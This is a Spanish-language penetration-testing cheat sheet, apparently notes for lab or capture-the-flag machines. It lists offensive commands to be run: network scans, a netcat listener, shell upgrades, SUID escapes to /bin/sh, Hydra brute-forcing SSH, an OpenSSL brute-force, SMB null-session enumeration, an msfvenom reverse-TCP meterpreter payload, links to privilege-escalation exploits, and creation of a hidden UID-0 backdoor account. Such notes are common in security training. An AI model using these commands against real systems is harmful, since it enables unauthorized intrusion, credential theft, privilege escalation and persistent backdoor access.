# Scaneos NMap 

nmap -sS 10.0.2.11/24  --> buscar maquinas
nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129

# Buscar con NC 

for var in $(seq 1 254); do nc -vv -n -w 1 172.17.0.$var 80-100 -z; done


# WEB: Directorios y Reconocimiento 

nikto -C all -h 10.0.2.11  --> enumeracion

gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -u http://raven.local
 
dirb http://192.168.190.132:8180 /usr/share/wordlists/dirb/big.txt

netdiscover -r 192.168.190.0/24 -i vmnet1

# Busqueda de vulnerabilidades

Acceso:
searchsploit
php mailer

nc -lvp 4444


# escalada de privilegios y shells 

/dev/shm   <<--- directorio para compliar cuando no podamos

python -c 'import pty; pty.spawn("/bin/bash")'

awk 'BEGIN{system("/bin/bash")}'

find / -perm -u=s -type f 2>/dev/null

Listado de Archivos SUID: https://gtfobins.github.io/#+sudo

touch raj
find raj -exec "whoami" \;
find raj -exec "/bin/sh" \;

https://www.exploit-db.com/exploits/37292/

https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html

Linux PAM:
https://raw.githubusercontent.com/1N3/PrivEsc/master/linux/linux_exploits/14339.sh

http://www.reydes.com/d/?q=Escalar_Privilegios_Localmente_en_un_Sistema_Linux_utilizando_Mempodipper


METASPLOIT

exploit/windows/local/ms10_015_kitrap0d

"post/multi/recon/local_exploit_suggester"


# Portknocking  

apt install knockd

knock cyb.local 1970 1955 1955 1961

nmap -p- cyb.local


# Fuerza bruta para openssl 

sudo apt install bruteforce-salted-openssl

bruteforce-salted-openssl -t 6 -f .trash -c CAMELLIA-192-ECB .reminder.enc




# Hydra contra ssh 

hydra -L /root/users.txt -P /root/.trash ssh://10.0.2.16


# MSFVENOM 

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LAB IP> LPORT=<PORT> -f aspx > devel.aspx

https://netsec.ws/?p=331

# Buscar con NC 

for var in $(seq 1 254); do nc -vv -n -w 1 172.17.0.$var 80-100 -z; done

# SMB Session NUL

http://10degres.net/smb-null-session/

rpcclient -U "" 10.10.5.101

srvinfo
enumdomusers
enumalsgroups builtin
enumprivs
netshareenum



No esta instalada por defectos con el samba commons 

# KEYS para root SSH 

https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys



# CREAR USUARIOS ADMIN

useradd -u 0 -o -g 0 nombreusuario
sudo passwd nombreusuario


# SERVERS PYTHON

python3 -m http.server 8080
python -m SimpleHTTPServer 8000



